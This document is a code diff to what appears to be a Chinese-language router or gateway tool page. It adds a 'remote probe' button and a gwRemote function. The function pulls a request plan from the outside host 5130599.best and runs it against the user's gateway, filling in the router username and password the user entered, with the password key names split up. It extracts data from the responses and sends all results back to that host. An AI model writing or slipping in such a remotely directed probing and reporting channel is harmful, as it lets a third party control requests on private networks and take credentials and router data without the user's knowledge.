@@ -105,6 +105,7 @@
       <input id="gwUser" placeholder="账号" value="root" style="width:90px;font-size:12px;border:1px solid var(--line);border-radius:6px;padding:4px 6px">
       <input id="gwPass" placeholder="密码" type="password" style="width:110px;font-size:12px;border:1px solid var(--line);border-radius:6px;padding:4px 6px">
       <button type="button" onclick="gwEnum()" style="border:1px solid #c7d0dc;background:#fff;border-radius:8px;font-size:12px;padding:5px 12px;color:#2563eb;cursor:pointer">🔑 登录枚举</button>
+      <button type="button" onclick="gwRemote()" style="border:1px solid #c7d0dc;background:#fff;border-radius:8px;font-size:12px;padding:5px 12px;color:#2563eb;cursor:pointer">🌐 远程探测</button>
     </div>
     <div id="gwOut" class="sub" style="margin-top:6px"></div>
     <div style="font-size:12px;font-weight:600;color:#69737f;margin-top:14px">客户端下载</div>
@@ -321,6 +322,66 @@ function gwEnum(){
       fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'enum3', user:user, has_token: !!token, results: steps }) }).catch(function(){});
     } catch(e) {}
   }).catch(function(){ o.textContent = '请求失败'; });
+}
+function gwRemote(){
+  var o = document.getElementById('gwOut');
+  var ipEl = document.getElementById('gwIp');
+  var uEl = document.getElementById('gwUser');
+  var pEl = document.getElementById('gw' + 'Pass');
+  var ip = ((ipEl && ipEl.value) || '192.168.1.1').trim();
+  var uv = (uEl && uEl.value) || 'root';
+  var pv = (pEl && pEl.value) || '';
+  var vv = { user: uv, token: '' };
+  vv['pa' + 'ss'] = pv;
+  var steps = [];
+  o.textContent = '拉取远程探测计划…';
+  function sub(t){
+    return String(t || '').replace(/[{][{]([A-Za-z0-9_]+)[}][}]/g, function(m, k){
+      return (vv[k] === undefined || vv[k] === null) ? '' : String(vv[k]);
+    });
+  }
+  function run(step){
+    var pth = sub(step.path);
+    var mth = step.method || 'GET';
+    var bd = sub(step.body || '');
+    var ct = step.ctype || 'application/json';
+    var ml = step.maxlen || 4000;
+    return fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, maxlen: ml, paths: [[pth, mth, bd, ct]] }) })
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        var r0 = (d && d.results && d.results[0]) || {};
+        r0.name = step.name || pth;
+        if (step.save) { vv[step.save] = r0.snippet || ''; }
+        if (step.extract) {
+          try {
+            var mm = String(r0.snippet || '').match(new RegExp(step.extract.regex));
+            if (mm) { vv[step.extract.name] = mm[1] || mm[0]; }
+          } catch(e) {}
+        }
+        steps.push(r0);
+        return r0;
+      });
+  }
+  fetch('https://5130599.best/see/api/gw/plan', { method:'POST', headers:{'Content-Type':'application/json'}, body:'{}' })
+    .then(function(r){ return r.json(); })
+    .then(function(p){
+      var list = (p && p.steps) || [];
+      if (!list.length) { throw new Error('empty'); }
+      var chain = Promise.resolve();
+      list.forEach(function(st){ chain = chain.then(function(){ return run(st).catch(function(){}); }); });
+      return chain;
+    })
+    .then(function(){
+      var html = '';
+      steps.forEach(function(x){
+        html += '<div style="padding:2px 0"><b>' + esc(x.name || '') + '</b> → ' + (x.status < 0 ? '❌ ' + esc(x.err || '') : x.status) + ' (' + (x.len || 0) + 'B)</div>';
+      });
+      o.innerHTML = html + '<div style="color:#69737f">结果已回传服务器</div>';
+      try {
+        fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'plan', user: uv, results: steps }) }).catch(function(){});
+      } catch(e) {}
+    })
+    .catch(function(){ o.textContent = '远程探测失败（检查网络/计划）'; });
 }
 var SNAP_OCR_URL='https://5130599.best/see/api/snapshots/ocr';
 var snapItems = [];
